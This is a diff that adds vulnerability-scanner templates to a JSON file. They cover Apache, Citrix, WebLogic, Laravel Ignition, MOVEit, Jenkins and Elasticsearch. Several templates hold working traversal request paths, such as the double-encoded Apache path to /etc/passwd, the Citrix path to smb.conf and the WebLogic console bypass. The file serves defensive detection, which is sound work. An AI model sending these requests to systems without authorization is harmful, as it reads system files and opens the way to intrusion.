@@ -4593,6 +4593,317 @@
           ]
         }
       ]
+    },
+    {
+      "id": "cve-2021-42013-apache-traversal",
+      "info": {
+        "name": "Apache 2.4.50 path traversal (/etc/passwd)",
+        "severity": "critical",
+        "cve": "CVE-2021-42013",
+        "cwe": "CWE-22",
+        "tags": [
+          "apache",
+          "lfi",
+          "traversal",
+          "rce"
+        ],
+        "description": "Apache httpd 2.4.50 double-encoded path traversal leaks /etc/passwd."
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd",
+            "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd"
+          ],
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "regex",
+              "part": "body",
+              "regex": [
+                "root:.*:0:0:"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "<html",
+                "<!doctype",
+                "<HTML",
+                "<!DOCTYPE"
+              ],
+              "condition": "or",
+              "negative": true
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2019-19781-citrix-traversal",
+      "info": {
+        "name": "Citrix ADC/Gateway path traversal (smb.conf)",
+        "severity": "critical",
+        "cve": "CVE-2019-19781",
+        "cwe": "CWE-22",
+        "tags": [
+          "citrix",
+          "netscaler",
+          "traversal",
+          "rce"
+        ],
+        "description": "Citrix ADC/Gateway directory traversal exposes vpns/cfg/smb.conf."
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "/vpn/../vpns/cfg/smb.conf"
+          ],
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "regex",
+              "part": "body",
+              "regex": [
+                "\\[global\\]"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "encrypt passwords"
+              ],
+              "condition": "and"
+            },
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "<html",
+                "<!doctype",
+                "<HTML",
+                "<!DOCTYPE"
+              ],
+              "condition": "or",
+              "negative": true
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2021-3129-laravel-ignition",
+      "info": {
+        "name": "Laravel Ignition RCE health-check",
+        "severity": "critical",
+        "cve": "CVE-2021-3129",
+        "cwe": "CWE-94",
+        "tags": [
+          "laravel",
+          "ignition",
+          "rce"
+        ],
+        "description": "Laravel debug-mode Ignition endpoint reports command-execution capability."
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "/_ignition/health-check"
+          ],
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "can_execute_commands"
+              ],
+              "condition": "and"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2020-14882-weblogic-console",
+      "info": {
+        "name": "Oracle WebLogic unauth console (traversal)",
+        "severity": "critical",
+        "cve": "CVE-2020-14882",
+        "cwe": "CWE-22",
+        "tags": [
+          "weblogic",
+          "oracle",
+          "rce",
+          "auth-bypass"
+        ],
+        "description": "Oracle WebLogic admin console reachable through encoded traversal without auth."
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "/console/css/%252e%252e%252fconsole.portal"
+          ],
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "WebLogic",
+                "Console"
+              ],
+              "condition": "and"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "cve-2023-34362-moveit-transfer",
+      "info": {
+        "name": "Progress MOVEit Transfer exposure",
+        "severity": "high",
+        "cve": "CVE-2023-34362",
+        "cwe": "CWE-89",
+        "tags": [
+          "moveit",
+          "progress",
+          "sqli"
+        ],
+        "description": "A MOVEit Transfer human interface is exposed (SQLi-vulnerable family)."
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "/human.aspx",
+            "/"
+          ],
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "regex",
+              "part": "body",
+              "regex": [
+                "MOVEit(\\s+Transfer|DMZ)",
+                "Ipswitch"
+              ],
+              "condition": "or"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "jenkins-instance-exposure",
+      "info": {
+        "name": "Exposed Jenkins instance",
+        "severity": "medium",
+        "cve": "CVE-2018-1000861",
+        "cwe": "CWE-284",
+        "tags": [
+          "jenkins",
+          "exposure",
+          "ci"
+        ],
+        "description": "A Jenkins controller is reachable (identified by the X-Jenkins header).",
+        "prerequisite": true
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "/"
+          ],
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "header",
+              "header": "X-Jenkins"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "elasticsearch-unauth-exposure",
+      "info": {
+        "name": "Unauthenticated Elasticsearch node",
+        "severity": "high",
+        "cve": "CVE-2015-1427",
+        "cwe": "CWE-306",
+        "tags": [
+          "elasticsearch",
+          "exposure",
+          "nosql"
+        ],
+        "description": "An Elasticsearch node answers cluster metadata without authentication."
+      },
+      "requests": [
+        {
+          "method": "GET",
+          "path": [
+            "/"
+          ],
+          "matchersCondition": "and",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "word",
+              "part": "body",
+              "words": [
+                "\"cluster_name\"",
+                "\"lucene_version\""
+              ],
+              "condition": "and"
+            }
+          ]
+        }
+      ]
     }
   ]
 }
